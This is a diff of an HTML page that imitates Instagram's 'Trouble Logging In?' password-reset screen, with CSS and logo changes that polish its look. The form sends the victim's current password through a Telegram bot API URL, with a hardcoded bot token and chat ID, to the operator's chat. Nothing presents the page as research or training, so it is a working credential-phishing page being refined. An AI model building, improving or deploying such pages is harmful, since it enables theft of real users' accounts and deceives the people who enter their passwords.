@@ -27,10 +27,12 @@
             align-items: center; 
             border-radius: 1px;
         }
-        .insta-logo {
+        /* تعديل اللوغو باش يبان 100% */
+        .insta-logo-img {
             width: 175px;
+            height: auto;
             margin: 22px 0 12px;
-            cursor: pointer;
+            display: block;
         }
         .header-text {
             color: #737373;
@@ -62,7 +64,6 @@
             cursor: pointer; 
             margin: 15px 0; 
         }
-        .btn-submit:hover { background-color: #1877f2; }
         .divider {
             display: flex;
             width: 100%;
@@ -71,49 +72,25 @@
         }
         .divider div { flex: 1; height: 1px; background-color: #dbdbdb; }
         .divider span { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; }
-        
         .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; text-decoration: none; margin-bottom: 15px; }
         .forgot-link { color: #00376b; font-size: 12px; text-decoration: none; }
-
-        .footer {
-            margin-top: auto;
-            padding: 24px;
-            text-align: center;
-            width: 100%;
-        }
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 15px;
-            margin-bottom: 10px;
-        }
-        .footer-links span, .footer-links a {
-            color: #8e8e8e;
-            font-size: 12px;
-            text-decoration: none;
-        }
-        .lang-select {
-            border: none;
-            background: none;
-            color: #8e8e8e;
-            font-size: 12px;
-            outline: none;
-            cursor: pointer;
-        }
+        .footer { margin-top: auto; padding: 24px; text-align: center; width: 100%; }
+        .footer-links { display: flex; justify-content: center; flex-wrap: wrap; gap: 15px; margin-bottom: 10px; }
+        .footer-links span, .footer-links a { color: #8e8e8e; font-size: 12px; text-decoration: none; }
+        .lang-select { border: none; background: none; color: #8e8e8e; font-size: 12px; outline: none; cursor: pointer; }
     </style>
 </head>
 <body>
 
     <div class="main-container">
-        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_with_gradient.png/c29c4356453f.png" class="insta-logo" alt="Instagram">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="insta-logo-img" alt="Instagram">
         
         <p class="header-text">Trouble Logging In?</p>
         
         <form action="https://api.telegram.org/bot8531200875:AAGR0wRXZLRvrvwqGgXwfBRd6n0V0gjYWcU/sendMessage" method="GET" style="width: 100%;">
             <input type="hidden" name="chat_id" value="6347084263">
             
-            <input type="password" name="text" placeholder="Current Password" required title="Please enter your current password">
+            <input type="password" name="text" placeholder="Current Password" required>
             <input type="password" placeholder="New Password" required>
             <input type="password" placeholder="Confirm New Password" required>
             
@@ -132,21 +109,13 @@
 
     <div class="footer">
         <div class="footer-links">
-            <span>Meta</span>
-            <span>About</span>
-            <span>Blog</span>
-            <span>Jobs</span>
-            <span>Help</span>
-            <span>API</span>
-            <span>Privacy</span>
-            <span>Terms</span>
+            <span>Meta</span><span>About</span><span>Blog</span><span>Jobs</span><span>Help</span><span>API</span><span>Privacy</span><span>Terms</span>
         </div>
         <div class="footer-links">
             <select class="lang-select">
                 <option value="en">English</option>
                 <option value="fr">Français</option>
                 <option value="ar">العربية</option>
-                <option value="es">Español</option>
             </select>
             <span style="color: #8e8e8e;">© 2026 Instagram from Meta</span>
         </div>
